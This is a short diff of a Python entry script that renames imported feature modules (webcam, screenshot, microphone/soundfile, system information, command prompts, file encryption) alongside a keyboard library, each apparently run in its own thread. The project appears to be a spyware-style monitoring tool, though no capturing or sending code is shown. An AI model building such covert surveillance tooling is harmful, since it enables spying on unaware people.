@@ -1,10 +1,10 @@
 import keyboard
 import threading
 from Features.CmdPrompts.CmdPrompts import CmdPrompts
-from Features.Recordings.Webcamera import Webcamera
-from Features.Screenshots.Screenshot import Screenshot
-from Features.Soundfile.Microphone import Microphone
-from Features.SystemInformation.Sysinfo import SysInfo
+from Features.Webcamera.Webcamera import Webcamera
+from Features.Screenshot.Screenshot import Screenshot
+from Features.Soundfile.Soundfile import Soundfile
+from Features.SystemInformation.SystemInformation import SystemInformation
 from Util.FileEncryption import FileEncryption
 
 
@@ -32,8 +32,8 @@ def main():
         cmd_prompts = CmdPrompts()
         web_camera = Webcamera()
         screenshot = Screenshot()
-        microphone = Microphone()
-        sys_info = SysInfo()
+        microphone = Soundfile()
+        sys_info = SystemInformation()
         file_encryptor = FileEncryption()
 
         # Create threads for each feature
